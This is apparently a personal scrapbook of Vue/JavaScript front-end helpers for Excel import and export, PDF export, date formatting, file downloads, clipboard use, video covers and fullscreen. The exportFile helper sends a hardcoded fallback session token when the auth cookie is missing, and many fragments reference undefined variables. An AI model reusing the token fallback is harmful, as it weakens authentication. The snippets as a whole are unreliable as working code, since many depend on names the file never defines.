import html2Canvas from 'html2canvas';
import JsPDF from 'jspdf';
import * as XLSX from 'xlsx';
import tVue from '@/main.js';
import Axios from 'axios';
export const vue = {
  titleKey: [
    {
      title: '合同编号',
      key: 'contractNo',
      valid: [{ fun: this.isExist, msg: cantEmpty }],
    },
    {
      title: '合同名称',
      key: 'name',
      valid: [{ fun: this.isExist, msg: cantEmpty }],
    },
    {
      title: '服务期',
      key: 'fwq',
      valid: [
        { fun: this.isExist, msg: cantEmpty },
        { fun: this.checkDate, msg: dateContent },
      ],
      save: {
        name: ['serviceStartDate', 'serviceEndDate'],
        fun: this.genSpecDate,
      },
    },
    {
      title: '合同期',
      key: 'htq',
      valid: [
        { fun: this.isExist, msg: cantEmpty },
        { fun: this.checkDate, msg: dateContent },
      ],
      save: {
        name: ['contractStartDate', 'contractEndDate'],
        fun: this.genSpecDate,
      },
    },
    {
      title: '质保期',
      key: 'zbq',
      valid: [
        { fun: this.isExist, msg: cantEmpty },
        { fun: this.checkDate, msg: dateContent },
      ],
      save: {
        name: ['qaStartDate', 'qaEndDate'],
        fun: this.genSpecDate,
      },
    },
    {
      title: '乙方',
      key: 'spName',
      valid: [{ fun: this.isExist, msg: cantEmpty }],
    },
    {
      title: '合同金额',
      key: 'amount',
      valid: [{ fun: this.isExist, msg: cantEmpty }],
    },
    { title: '合同内容', key: 'contractContent' },
    { title: '质保内容', key: 'qaContent' },
    { title: '备注（付款方式）', key: 'note' },
  ],
  computed: {
    exeHeader() {
      return this.titleKey.map(t => t.title);
    },
    propKey() {
      return this.titleKey.map(t => t.key);
    },
  },
  regCheck(item) {
    let { obj } = item;
    let message = '';
    this.titleKey.forEach(tk => {
      let vArr = tk.valid;
      if (vArr && vArr.length) {
        vArr.forEach(v => {
          if (!v.fun(obj[tk.title])) {
            message += tk.title + v.msg;
          }
        });
      }
    });
    console.log('excelRegCheck:', obj, message);
    return message;
  },
  upload(e) {
    this.common.getFile({
      e,
      _this: this,
      key: this.propKey,
      title: this.exeHeader,
      commonParams: {},
      regCheck: this.regCheck,
      callback: this.saveBatch,
    });
  },
  saveBatch(arrT) {
    let params = [];
    for (let i = 0; i < arrT.length; i++) {
      let a = arrT[i];
      let camp = this.chosenRow;
      if (camp) {
        let obj = {
          contractTypeName: camp.name,
          contractTypeId: camp.id,
        };
        this.titleKey.forEach(tk => {
          let key = tk.key;
          let save = tk.save;
          if (save) {
            if (this.isExist(a[key])) {
              let value = save.fun(a[key]);
              value.forEach((v, index) => {
                obj[save.name[index]] = v;
              });
            }
          } else {
            obj[key] = a[key] || '';
          }
        });
        console.log(a, obj);
        params.push(obj);
      }
    }
    contract(params, 'saveBatch').then(res => {
      if (res && res.code === '000000') {
        this.$message({
          showClose: true,
          type: 'success',
          message: '导入成功！',
        });
        this.getTableData(1);
      }
    });
  },
};
export default {
  setStore(str, value) {
    store.commit('set_' + str, value);
    sessionStorage.setItem(str, JSON.stringify(value));
  },
  getStore(str) {
    let vx = store.state[str];
    let flag = vx || vx === 0;
    if (vx instanceof Array) {
      flag = vx.length > 0;
    } else if (typeof vx === 'object') {
      flag = Object.keys(vx).length;
    }
    let st = sessionStorage.getItem(str);
    return flag ? vx : st && JSON.parse(st);
  },
  backSetStore(info = {}) {
    let { storedKey, home, from, fun, that, replace, routeParams } = info;
    // 加入routeParams之前，考虑的都是搜索参数，它们刷新时消失了也无所谓，但是routeParams必须一直存在，所以不能只用vuex，而是用了getStore()，
    // 而搜索参数会在页面初始化后被backGetStore删掉，所以也不存在刷新后搜索参数还在的情况。
    // 移动端看不到url，所以用了`/route/:id`，而且对于同一组件不同路由(add,edit)，传参不同可能会导致问题。
    let backStore = this.getStore('backStore') || [];
    let index = backStore.findIndex(b => b.home === home);
    // 从home跳转到from，所以会从from返回
    let obj = { home, from, fun, value: {} };
    storedKey &&
      storedKey.forEach(k => {
        if (that[k] instanceof Array) {
          obj.value[k] = [...that[k]];
        } else if (that[k].constructor === Object) {
          let name = k;
          if (replace && replace.replaceObj) {
            name = replace.replaceObj;
          }
          obj.value[name] = { ...that[k] };
        } else {
          obj.value[k] = that[k];
        }
      });
    if (index > -1) {
      backStore[index] = obj;
    } else {
      backStore.push(obj);
    }
    if (routeParams) {
      let n = backStore.findIndex(b => b.unique4RouteParams);
      if (n > -1) {
        let arr = backStore[n].paths;
        let flag = arr.some(a => {
          if (a.path === from) {
            a.routeParams = routeParams;
          }
          return a.path === from;
        });
        if (!flag) {
          arr.push({ path: from, routeParams });
        }
      } else {
        backStore.push({
          unique4RouteParams: true,
          paths: [{ path: from, routeParams }],
        });
      }
    }
    this.setStore('backStore', backStore);
  },
  backGetStore(home, from, that) {
    let backStore = this.getStore('backStore') || [];
    let index;
    let obj = backStore.find((b, id) => {
      let f = b.home === home;
      if (f) {
        index = id;
      }
      return f;
    });
    if (obj && (from === obj.from || from === '/' || (obj.fun && obj.fun()))) {
      console.log('backGetStore:', obj, backStore, home, from, index);
      for (let k in obj.value) {
        that[k] = obj.value[k];
      }
      backStore.splice(index, 1);
      this.setStore('backStore', backStore);
    }
    // console.log("vm", that);
  },
  // 刷新时路由传参消失，所以需要额外存储，当然也可以用`/route/:id`的方式，但会暴露
  getRouteParams(route) {
    let q = route.params;
    let keys = Object.keys(q);
    if (keys.length) {
      return q;
    } else {
      let backStore = this.getStore('backStore') || [];
      let obj = backStore.find(b => b.unique4RouteParams);
      if (obj) {
        let arr = obj.paths;
        // a.path是跳转前保存的from，因为没用splice删除所以会一直存在，比如A → b ↔ C，A跳转b时保存的from为b，C返回b时可直接用。
        let item = arr.find(a => a.path === route.path);
        if (item) {
          return item.routeParams;
        }
      }
      return {};
    }
  },
  confirm(obj = {}) {
    let { that, title, body } = obj;
    const h = that.$createElement;
    return that.$confirm('', {
      message: h('div', null, [
        h(
          'div',
          {
            style: 'display:flex; align-items:center',
          },
          [
            h('i', {
              class: 'el-icon-warning',
              style: 'color:#f90;font-size:21px;height:24px;line-height:24px;',
            }),
            h(
              'span',
              {
                style:
                  'margin-left:17.5px;font-size:16px;height:24px;line-height:24px;font-weight:700;',
              },
              title
            ),
          ]
        ),

        h(
          'p',
          {
            style:
              'margin:16px 0 0 38.5px;font-style: normal;font-weight: 400;font-size: 14px;line-height: 22px;',
          },
          body
        ),
      ]),
      confirmButtonText: '确 定',
      cancelButtonText: '取 消',
    });
  },
  // $refs导出
  getDoc() {
    let r = this.$refs.exportTable;
    let arr = (r && r.$children) || [];

    let info = arr.filter(a => a.label && a.prop && a.label !== '序号' && a.label !== '操作');
    let head = info.map(i => i.label);
    let print = [head];
    let p = {
      filter: {
        keyword: this.keyword || undefined,
      },
      isPage: false,
    };
    driver(p).then(res => {
      this.common.dealRes(res, () => {
        let tableData = res.data || [];
        tableData.forEach(t => {
          t.userInfo = `${t.name}(${t.id})`;
          let arr = [];
          info.forEach(i => {
            arr.push(t[i.prop]);
          });
          print.push(arr);
        });
        this.exportExcel(print, '驾驶员信息.xlsx');
      });
    });
  },
  // file-saver 导出el-table
  fileSaverAs(id, fileName) {
    var xlsxParam = { raw: true }; // 导出的内容只做解析，不进行格式转换
    var wb = XLSX.utils.table_to_book(document.querySelector('#' + id), xlsxParam);

    /* get binary string as output */
    var wbout = XLSX.write(wb, {
      bookType: 'xlsx',
      bookSST: true,
      type: 'array',
    });
    try {
      import('file-saver').then(({ saveAs }) => {
        saveAs.saveAs(new Blob([wbout], { type: 'application/octet-stream' }), fileName);
      });
    } catch (e) {
      throw e;
    }
  },
  /********************************************1.导入导出Excel文件，二进制导出文件********************************************/
  // 二维数组导出Excel
  exportExcel(arr, fileName) {
    let ws = XLSX.utils.aoa_to_sheet(arr);
    var sheet = XLSX.utils.json_to_sheet(arr, {
      skipHeader: true,
    });

    //第一次使用的朋友可以添加一句输出看看sheet的数据结构
    //console.log(sheet)

    //遍历每个格子
    for (const key in sheet) {
      if (key === '!ref') continue;
      //给每个格子修改样式
      sheet[key].s = {
        border: {
          //添加边框
          bottom: {
            style: 'thin',
            color: '000000',
          },
          left: {
            style: 'thin',
            color: '000000',
          },
          right: {
            style: 'thin',
            color: '000000',
          },
          top: {
            style: 'thin',
            color: '000000',
          },
        },
        //字体水平居中、垂直居中、自动换行、缩进
        alignment: {
          horizontal: 'center', //水平居中
          vertical: 'center',
          wrapText: 1,
          indent: 0,
        },
        //字体类型、大小、是否加粗
        font: {
          //字体
          name: '等线',
          sz: 9,
          bold: false,
        },
      };
      //给特定格子（带'1'的，即首行 标题）添加样式，下面同理
      if (key.replace(/[^0-9]/gi, '') === '1') {
        sheet[key].s = {
          ...sheet[key].s,
          fill: {
            //背景色
            fgColor: { rgb: '#9e9e9e' },
            // fgColor: { rgb: 'EBF1DE' },
          },
          font: {
            //覆盖字体
            name: '等线',
            sz: 11,
            bold: true,
          },
        };
      }
      if (key === 'A1') {
        sheet[key].s = {
          ...sheet[key].s,
          fill: {
            //背景色
            fgColor: { rgb: '#E4DFEC' },
          },
        };
      }
      if (
        key === 'C1' ||
        key === 'B1' ||
        key === 'D1' ||
        key === 'E1' ||
        key === 'F1' ||
        key === 'G1' ||
        key === 'H1'
      ) {
        sheet[key].s = {
          ...sheet[key].s,
          fill: {
            //背景色
            fgColor: { rgb: '#FDE9D9' },
          },
        };
      }
    }
    //列宽
    let colsP = [
      {
        wch: 18.11, //A
      },
      {
        wch: 12.67, //B
      },
      {
        wch: 8.11, //C
      },
      {
        wch: 8.11, //D
      },
      {
        wch: 8.11, //E
      },
      {
        wch: 6.78, //F
      },
      {
        wch: 8.11, //G
      },
      {
        wch: 8.11, //H
      },
    ];
    sheet['!cols'] = colsP;

    console.log(sheet, ws);
    let wb = XLSX.utils.book_new();
    // XLSX.utils.book_append_sheet(wb, ws);
    XLSX.utils.book_append_sheet(wb, sheet);
    XLSX.writeFile(wb, fileName);
  },
  // 导入方法sheet_to_json, title为excel第一行表头，key对应的属性字段，callback为保存接口。
  checkExcelData(data, obj) {
    const { _this, key, title, regCheck, callback, commonParams } = obj;
    if (!Array.isArray(data)) {
      throw '需要数组';
    }
    if (!data.length) {
      _this.$message({
        showClose: true,
        type: 'warning',
        message: '导入文件没有数据',
      });
      throw '没有数据';
    }
    const head = Object.keys(data[0]) || [];
    const arr = head.filter((t, index, A) => A.indexOf(t) === index) || [];
    let flag = 0;
    if (!arr.length) {
      ++flag;
    }
    arr.forEach(item => {
      if (!title.includes(item)) {
        ++flag;
      }
    });
    if (flag) {
      _this.$message({
        showClose: true,
        type: 'warning',
        message: '表头有误，请按模板导入。',
      });
      throw '表头有误';
    }
    let arrT = [];
    data.forEach(obj => {
      let msg = regCheck && regCheck({ obj });
      if (msg) {
        flag++;
        _this.$message({
          duration: 3000,
          showClose: true,
          type: 'warning',
          message: msg,
        });
        throw msg;
      }
      let arrEle = { ...commonParams };
      title.forEach((item, index) => {
        arrEle[key[index]] = obj[item];
      });
      arrT.push(arrEle);
    });
    if (!flag) {
      callback(arrT);
    }
  },
  checkExcelData_txt(arr) {
    let flag = 0;
    if (arr && arr.length && arr.length > 1) {
      // XLSX.utils.sheet_to_txt()
      arr.forEach((item, index) => {
        if (index === 0) {
          item.forEach((i, id) => {
            // 导入文件的表头与模板表头不同
            if (i !== this.title[0][id] && item.length !== this.title.length) {
              flag++;
              this.$message({
                showClose: true,
                type: 'warning',
                message: '表头有误，请按模板导入。',
              });
              throw '表头有误';
            }
          });
        } else {
          item.forEach((i, n) => {
            // 校验每格数据
            let msg = this.regCheck({ index: n, name: i });
            if (msg) {
              flag++;
              throw msg;
            }
          });
        }
      });
      if (!flag) {
        let rest = arr.slice(1);
        let arrT = [];
        rest.forEach(r => {
          let arrEle = { relationship: this.rs };
          r.forEach((item, index) => {
            arrEle[this.name[index]] = item;
          });
          arrT.push(arrEle);
        });
        // 主键相同的行如何操作
        // this.getSamePrimaryKey(arrT);
        // 调用接口保存导入的数据
        personSaveBatch(arrT).then(res => {
          if (res && res.code === '000000') {
            this.$message({
              showClose: true,
              type: 'success',
              message: '导入成功！',
            });
            this.refGet();
          }
        });
      }
    }
  },
  // 导入Excel
  getFile(obj) {
    const { e, _this, cellDates } = obj;
    let f = e.target.files[0];
    _this.$refs.uploadDom.value = '';
    if (!judgeIfExcel(f)) {
      _this.$message({
        showClose: true,
        type: 'warning',
        message: '仅支持xlsx、xls格式文件',
      });
      return;
    }
    if (f.size > 10 * 1000 * 1000) {
      _this.$message({
        showClose: true,
        type: 'warning',
        message: '文件大小不能超过10M',
      });
      return;
    }
    const fileReader = new FileReader();
    fileReader.onload = ev => {
      const workbook = XLSX.read(ev.target.result, {
        type: 'binary',
        cellDates,
      });
      const wsname = workbook.SheetNames[0];
      const ws = XLSX.utils.sheet_to_json(workbook.Sheets[wsname]);
      console.log('ws:', ws); // 转换成json的数据
      this.checkExcelData(ws, obj);
    };
    fileReader.readAsBinaryString(f);
  },
  // Function: 导出文件
  exportFile(url, isGet, params, fileName, fileType) {
    const loading = tVue.$loading({
      lock: true,
      text: '导出中',
      spinner: 'el-icon-loading',
      background: 'rgba(0, 0, 0, 0.7)',
    });
    Axios({
      url: window.g.ApiUrl2 + url,
      method: isGet ? 'GET' : 'POST',
      responseType: 'blob', // 最关键！！！！
      headers: { IDSTGC: getCookie('IDSTGC') || '7d237f2b3db14c6eb4994258fd83aa8a' },
      data: params,
    })
      .then(res => {
        let url = window.URL.createObjectURL(res.data);
        let link = document.createElement('a');
        link.href = url;
        link.style.display = 'none';
        link.setAttribute('download', fileName + '.' + fileType);
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        window.URL.revokeObjectURL(url);
        loading.close();
      })
      .catch(e => {
        loading.close();
      });
  },
  // serviceOrder(p, "export").then(res => {
  //       this.common.apiDownloadFile(res, this.NAME + ".xlsx");
  //     });
  apiDownloadFile() {
    function download(res, fileName) {
      let f = fileName.split('.');
      let ext = f[f.length - 1];
      f.splice(f.length - 1, 1);
      let blob = new Blob([res]);
      // let blob = new Blob([res], { type: ext });
      if (blob.size > 0) {
        let url = window.URL.createObjectURL(blob);
        let link = document.createElement('a');
        link.href = url;
        link.style.display = 'none';
        link.setAttribute('download', fileName);
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        window.URL.revokeObjectURL(url);
      }
    }
    downFileId(item.id).then(res => {
      download(res, item.fileName);
    });
  },
  // 二进制读取文件
  readFile(url) {
    var res;
    $.ajax({
      url: url, // 文件位置
      type: 'GET', // 请求方式为get
      async: false,
      dataType: 'xml', // 返回数据格式为xml
      success: function (data) {
        res = data;
      },
    });
    return res;
  },
  // 原生 js 下载二进制流
  binaryDown(type) {
    let xmlResquest = new XMLHttpRequest();
    let url =
      location.protocol + '//' + location.host + urls + `dataAnalysis/${type}DataExcel?data=`;
    let param = JSON.stringify({ page: 1, start: 0 });
    url += encodeURIComponent(param);
    let fileName = type + '统计';
    xmlResquest.open('get', url, true);
    xmlResquest.responseType = 'blob';
    xmlResquest.timeout = 0; // 设置超时时间
    xmlResquest.onload = function (oEvent) {
      const content = xmlResquest.response;
      // 因为可能后端可能会传递 json 格式的报错信息，所以在接收信息的时候需要判断一下是否是 json 文件。如果是 json 文件，则为报错信息。不是 json 文件就是正常文本信息
      let fileReader = new FileReader();
      fileReader.onload = function () {
        try {
          let jsonData = JSON.parse(this.result); // 说明是普通对象数据，后台转换失败
          if (jsonData.code) {
          }
        } catch (error) {
          // 解析出错，可以下载，说明不是 json 对象
          // const elink = document.createElement('a');
          // elink.download = fileName;
          // elink.style.display = 'none';
          // const blob = new Blob([content]);
          // elink.href = URL.createObjectURL(blob);
          // document.body.appendChild(elink);
          // elink.click();
          // document.body.removeChild(elink);
          let url = window.URL.createObjectURL(content);
          let link = document.createElement('a');
          link.href = url;
          link.style.display = 'none';
          link.setAttribute('download', fileName + '.xlsx');
          document.body.appendChild(link);
          link.click();
          document.body.removeChild(link);
          window.URL.revokeObjectURL(url);
        }
      };
      fileReader.readAsText(content);
    };
    xmlResquest.send();
  },

  /********************************************2.日期********************************************/
  // Function : 时间函数封装
  formatTime(time, format, empty = '--') {
    let timeStr = time ? '' + time : '';
    let tf = function (d) {
      return d >= 10 ? d : '0' + d;
    };
    let dateObj;
    switch (timeStr.length) {
      case 17:
      case 16:
      case 15:
      case 14:
        dateObj = new Date(
          parseInt(timeStr.substring(0, 4)),
          parseInt(timeStr.substring(4, 6)) - 1,
          parseInt(timeStr.substring(6, 8)),
          parseInt(timeStr.substring(8, 10)),
          parseInt(timeStr.substring(10, 12)),
          parseInt(timeStr.substring(12, 14))
        );
        break;
      case 13:
        dateObj = new Date(time);
        break;
      case 8:
        dateObj = new Date(
          parseInt(timeStr.substring(0, 4)),
          parseInt(timeStr.substring(4, 6)) - 1,
          parseInt(timeStr.substring(6, 8))
        );
        break;
      default:
        dateObj = '';
        // throw "Ow<这是一条来自common的提示：format参数输入错误";
        console.log('format参数输入错误');
    }
    let timeString = '';
    if (dateObj) {
      timeString = format
        .replace(/YYYY/gi, dateObj.getFullYear() + '')
        .replace(/MM/g, tf(dateObj.getMonth() + 1))
        .replace(/DD/gi, tf(dateObj.getDate()))
        .replace(/hh/gi, tf(dateObj.getHours()))
        .replace(/mm/g, tf(dateObj.getMinutes()))
        .replace(/ss/gi, tf(dateObj.getSeconds()));
    } else {
      timeString = empty;
    }
    return timeString;
  },

  // 返回无分隔符年月日
  ymd(dateObj) {
    var myDate = dateObj || new Date();
    var month = myDate.getMonth() + 1;
    if (month >= 1 && month <= 9) {
      //月
      month = '0' + month;
    }
    var strDate = myDate.getDate();
    if (strDate >= 0 && strDate <= 9) {
      //日
      strDate = '0' + strDate;
    }
    var hour = myDate.getHours(); // 时

    if (hour >= 0 && hour <= 9) {
      hour = '0' + hour;
    }
    var minutes = myDate.getMinutes(); // 分
    if (minutes >= 0 && minutes <= 9) {
      minutes = '0' + minutes;
    }
    return '' + myDate.getFullYear() + month + strDate;
  },

  /********************************************3.导出pdf文件********************************************/
  // dom导出为pdf
  transToPdf(title, domID) {
    const loading = tVue.$loading({
      lock: true,
      text: '下载中',
      spinner: 'el-icon-loading',
      background: 'rgba(0, 0, 0, 0.7)',
    });

    let element = document.getElementById(domID); // 这个dom元素是要导出pdf的div容器
    html2Canvas(element).then(function (canvas) {
      var contentWidth = canvas.width;
      var contentHeight = canvas.height;

      //一页pdf显示html页面生成的canvas高度;
      var pageHeight = (contentWidth / 592.28) * 841.89;
      //未生成pdf的html页面高度
      var leftHeight = contentHeight;
      //页面偏移
      let position = 0;
      //a4纸的尺寸[595.28,841.89]，html页面生成的canvas在pdf中图片的宽高
      var imgWidth = 555.28;
      var imgHeight = (592.28 / contentWidth) * contentHeight;

      var pageData = canvas.toDataURL('image/jpeg', 1.0);

      // 分页
      var pdf = new JsPDF('', 'pt', 'a4');
      // var pdf = new JsPDF('', 'pt', [contentWidth, contentHeight]); //不分页
      // pdf.addImage(pageData, 'JPEG', 0, 0, contentWidth, contentHeight);

      //有两个高度需要区分，一个是html页面的实际高度，和生成pdf的页面高度(841.89)
      //当内容未超过pdf一页显示的范围，无需分页
      if (leftHeight < pageHeight) {
        pdf.addImage(pageData, 'JPEG', 0, 0, imgWidth, imgHeight);
      } else {
        while (leftHeight > 0) {
          pdf.addImage(pageData, 'JPEG', 0, position, imgWidth, imgHeight);
          leftHeight -= pageHeight;
          position -= 841.89;
          //避免添加空白页
          if (leftHeight > 0) {
            pdf.addPage();
          }
        }
      }
      pdf.save(title + '.pdf');
      loading.close();
      tVue[domID] = false;
    });
  },
  //避免分页被截断
  outPutPdfFn(domID, itemClass, title, useClass) {
    let vm = tVue;
    const A4_WIDTH = 592.28;
    const A4_HEIGHT = 841.89;
    // $myLoading 自定义等待动画组件，实现导出事件的异步等待交互
    vm.$nextTick(() => {
      // dom的id。
      let target = document.getElementById(domID);
      let tTop = target.getBoundingClientRect().top;
      let pageHeight = (target.scrollWidth / A4_WIDTH) * A4_HEIGHT;
      // let pageHeight = A4_HEIGHT;
      // 获取分割dom，此处为class类名为item的dom
      // let lableListID = target.getElementsByClassName(itemClass);
      let arr = useClass
        ? Array.from(target.getElementsByClassName(itemClass))
        : Array.from(target.children);
      let lableListID = arr.filter(t => t && t.getBoundingClientRect);
      console.log(target, arr, lableListID);
      // 进行分割操作，当dom内容已超出a4的高度，则将该dom前插入一个空dom，把他挤下去，分割
      for (let i = 0; i < lableListID.length; i++) {
        let lTop = lableListID[i].getBoundingClientRect().top;
        // let diff = lableListID[i].offsetTop + lableListID[i].offsetHeight;
        let diff = lTop - tTop;
        console.log(lTop, tTop, diff, pageHeight);
        let multiple = Math.ceil(
          // (lableListID[i].offsetTop + lableListID[i].offsetHeight) / pageHeight
          diff / pageHeight
        );
        if (this.isSplit(lableListID, i, pageHeight, tTop)) {
          let divParent = lableListID[i].parentNode; // 获取该div的父节点
          let newNode = document.createElement('div');
          newNode.className = 'emptyDiv';
          newNode.style.background = '#fff';
          // let _H = multiple * pageHeight - diff;
          // let _H = pageHeight - diff;
          let _H = lableListID[i].clientHeight;
          newNode.style.height = _H + 30 + 'px';
          newNode.style.width = '100%';
          divParent.insertBefore(newNode, lableListID[i]);
          console.log(_H, lableListID[i]);
          let next = lableListID[i].nextSibling; // 获取div的下一个同一层级节点
          // 判断兄弟节点是否存在
          if (next) {
            // 存在则将新节点插入到div的下一个兄弟节点之前，即div之后
            // divParent.insertBefore(newNode, next);
          } else {
            // 不存在则直接添加到最后,appendChild默认添加到divParent的最后
            // divParent.appendChild(newNode);
          }
          tTop = newNode.getBoundingClientRect().top;
        }
      }
      this.transToPdf(title, domID);
    });
  },
  // 判断是否需要添加空白div
  isSplit(nodes, index, pageHeight, tTop) {
    // 计算当前这块dom是否跨越了a4大小，以此分割
    if (
      // nodes[index].offsetTop + nodes[index].offsetHeight < pageHeight &&
      nodes[index].getBoundingClientRect().top - tTop < pageHeight &&
      nodes[index].getBoundingClientRect().top + nodes[index].clientHeight - tTop > pageHeight &&
      nodes[index].clientHeight < pageHeight / 3
      // nodes[index + 1] &&
      // nodes[index + 1].getBoundingClientRect().top - tTop > pageHeight
      // nodes[index + 1].offsetTop + nodes[index + 1].offsetHeight > pageHeight
    ) {
      return true;
    }
    return false;
  },
};

// 移动端 封装loading，由接口处决定是否提供loadingText
if (options.loadingText || options.loadingText === '') {
  tVue.$toast.loading({
    message: options.loadingText,
    forbidClick: true,
    overlay: true,
    duration: 0,
  });
}
let errMsg = res.message || res.msg || orgindata.msg || orgindata.message;
errMsg && tVue.$toast.fail(errMsg);
tVue.$toast.clear();

// pc端
loading = tVue.$loading({
  lock: true,
  text: options.loadingText,
  spinner: 'el-icon-loading',
  background: 'rgba(0, 0, 0, 0.7)',
});
loading.close();
errMsg &&
  tVue.$message({
    showClose: true,
    type: 'error',
    message: errMsg,
  });

// 复制到剪切板的两种方法
if (navigator && navigator.clipboard && navigator.clipboard.writeText) {
  navigator.clipboard.writeText(text).then(
    function () {
      console.log('Async: Copying to clipboard was successful!');
    },
    function (err) {
      console.error('Async: Could not copy text: ', err);
    }
  );
} else {
  const input = document.createElement('input');
  document.body.appendChild(input);
  input.setAttribute('value', text);
  input.select();
  if (document.execCommand('copy')) {
    document.execCommand('copy');
    console.log('复制成功');
  }
  document.body.removeChild(input);
}

// video结束标记
var md = document.getElementsByTagName('video')[0];
md.loop = false;
md.addEventListener('ended', () => {
  console.log('结束');
});

// 检测是否函数
function isFunction(v) {
  return [
    '[object Function]',
    '[object GeneratorFunction]',
    '[object AsyncFunction]',
    '[object Promise]',
  ].includes(Object.prototype.toString.call(v));
}
// 音频时长
{
  let timer = setInterval(() => {
    var musicDom = document.getElementById(t); //获取audio对象
    if (musicDom) {
      musicDom.load();
      musicDom.onloadedmetadata = function () {
        let duration = parseInt(musicDom.duration);
      };
      clearInterval(timer);
    }
  }, 500);
}
// 视频截图封面图
function getVideoCanvas(videoList, fun, that) {
  var videoCanList = []; // 因为后端返回的视频数组，这里先定义一个空数组
  videoList.forEach(item => {
    if (isVideo(item.fileType)) {
      // for循环获取到的视频数组
      // 因为是循环处理，这里定义一个promise函数
      var promise = new Promise(reslove => {
        // 在缓存中创建video标签
        var video = document.createElement('VIDEO');
        // 通过setAttribute给video dom元素添加自动播放的属性，因为视频播放才能获取封面图;
        video.setAttribute('autoplay', 'autoplay');
        // 再添加一个静音的属性，否则自动播放会有声音
        video.setAttribute('muted', 'muted');
        video.currentTime = 1;
        video.setAttribute('src', item.viewUrl);
        video.setAttribute('crossOrigin', 'anonymous'); //设置跨域 否则toDataURL导出图片失败
        // 上面我们只是创建了video标签，视频播放需要内部的source的标签，scr为播放源;
        // video.innerHTML = '<source src=' + item.viewUrl + ' crossorigin="anonymous">';
        // 再创建canvas画布标签
        var canvas = document.createElement('canvas');
        var ctx = canvas.getContext('2d');
        // video注册canplay自动播放事件
        video.addEventListener(
          'canplay',
          function () {
            // 创建画布的宽高属性节点，就是图片的大小，单位PX
            var anw = document.createAttribute('width');
            let w = video.videoWidth;
            let h = video.videoHeight;
            // anw.nodeValue = 160;
            anw.nodeValue = w;
            var anh = document.createAttribute('height');
            // anh.nodeValue = 90;
            anh.nodeValue = h;
            // console.log(video.videoWidth, video.videoHeight);
            canvas.setAttributeNode(anw);
            canvas.setAttributeNode(anh);
            // 画布渲染
            ctx.drawImage(video, 0, 0, anw.nodeValue, anh.nodeValue);
            // 生成图片
            var base64 = canvas.toDataURL('image/png'); // 这就是封面图片的base64编码
            // 视频结束播放的事件
            video.pause();
            let reg = /^[0-9.]+$/;
            let duration = reg.test(video.duration)
              ? moment.utc(video.duration * 1000).format('HH:mm:ss')
              : '';
            that &&
              that.$nextTick(() => {
                that.$set(item, 'cover', base64);
                that.$set(item, 'duration', duration);
              });
            item.w = w;
            item.h = h;
            reslove(base64); // promise函数成功的回调
          },
          false
        );
      });
      videoCanList.push(promise); // 这里将每一次promise函数成功回调的结果push进一开始定义的空数组
    } else if (isAudit(item.fileType)) {
      item.noCover = true;
      item.cover = require('@/assets/img/noCover.png');
    } else {
      item.cover = item.viewUrl;
    }
  });
  // 通过Promise.all方法等待上面的循环结束这里再执行业务逻辑
  Promise.all(videoCanList).then(() => {
    videoList = [...videoList];
    fun && fun();
    // console.log(res); // 这里就是每一张视频的封面图
  });
}
function forbidTouch() {
  // body样式，隐藏滚动条和禁止上滑刷新
  //   &::-webkit-scrollbar {
  //   width: 0;
  // }

  // overscroll-behavior-y: contain;

  // 禁用右键，移动端长按
  window.addEventListener('contextmenu', function (e) {
    e.preventDefault();
  });
  // 禁用双指放大
  document.documentElement.addEventListener(
    'touchstart',
    function (event) {
      if (event.touches.length > 1) {
        event.preventDefault();
      }
    },
    {
      passive: false,
    }
  );

  // 禁用双击放大
  var lastTouchEnd = 0;
  document.documentElement.addEventListener(
    'touchend',
    function (event) {
      var now = Date.now();
      if (now - lastTouchEnd <= 300) {
        event.preventDefault();
      }
      lastTouchEnd = now;
    },
    {
      passive: false,
    }
  );
}

// 中文字符排序
this.tableData = tmp.sort((a, b) => {
  return (
    typeof a.name === 'string' &&
    typeof b.name === 'string' &&
    a.name.localeCompare(b.name, 'zh-Hans-CN')
  );
});

// js控制全屏，必须是主动触发，比如按按钮
function requestFullScreen() {
  let element = window.document.documentElement;
  let requestMethod =
    element.requestFullScreen || //W3C
    element.webkitRequestFullScreen || //Chrome
    element.mozRequestFullScreen || //FireFox
    element.msRequestFullScreen; //IE11
  if (requestMethod) {
    // console.log(element, element.webkitRequestFullScreen);
    requestMethod.call(element, { navigationUI: 'hide' });
    // element.requestMethod({ navigationUI: 'hide' });
  } else if (typeof window.ActiveXObject !== 'undefined') {
    //for Internet Explorer
    let wscript = new ActiveXObject('WScript.Shell');
    if (wscript !== null) {
      wscript.SendKeys('{F11}');
    }
  }
}
// 一旦窗口变化就检查是否全屏
window.onresize = () => {
  // console.log(this.isFull, document.fullscreenElement, document.fullscreen);
  if (!document.fullscreen) {
    isFull = true;
    document.getElementsByClassName('full')[0].hidden = false;
  } else {
    document.getElementsByClassName('full')[0].hidden = true;
  }
};
// vue 多个组件中同时使用window.onresize时，只有一个组件起作用时，解决办法
// 将 window.onresize 替换成 window.addEventListener(“resize”, () => { })

const Vue = {
  /**
   js部分
   */
  mounted() {
    //初始化自适应  ----在刚显示的时候就开始适配一次
    handleScreenAuto();
    //绑定自适应函数   ---防止浏览器栏变化后不再适配
    window.onresize = () => handleScreenAuto();
  },
  deleted() {
    window.onresize = null;
  },
  methods: {
    //数据大屏自适应函数
    handleScreenAuto() {
      const designDraftWidth = 1920; //设计稿的宽度
      const designDraftHeight = 960; //设计稿的高度
      //根据屏幕的变化适配的比例
      const scale =
        document.documentElement.clientWidth / document.documentElement.clientHeight <
        designDraftWidth / designDraftHeight
          ? document.documentElement.clientWidth / designDraftWidth
          : document.documentElement.clientHeight / designDraftHeight;
      //缩放比例
      document.querySelector('#screen').style.transform = `scale(${scale}) translate(-50%)`;
    },
  },
};
/*
      CSS部分  --除了设计稿的宽高是根据您自己的设计稿决定以外，其他复制粘贴就完事
    */
/***
 <style>
  .screen-root {
    height: 100%;
    width: 100%;
    .screen {
        display: inline-block;
        width: 1920px;  //设计稿的宽度
        height: 960px;  //设计稿的高度
        transform-origin: 0 0;
        position: absolute;
        left: 50%;
        }
    }
   <style>
 */

// 监听浏览器关闭事件，适应ios，android
{
  function unloadHander() {
    localStorage.setItem('abc', '我监听到了浏览器的返回按钮事件啦'); //根据自己的需求实现自己的功能
  }
  window.addEventListener(
    'unload',
    function (e) {
      unloadHander();
    },
    false
  );
  window.addEventListener(
    'pagehide',
    function (e) {
      unloadHander();
    },
    false
  );
  let tmp = localStorage.getItem('abc');
  tmp && alert(tmp);
}

// scrollviewer
(global => {
  const _getItem = global.sessionStorage.getItem;
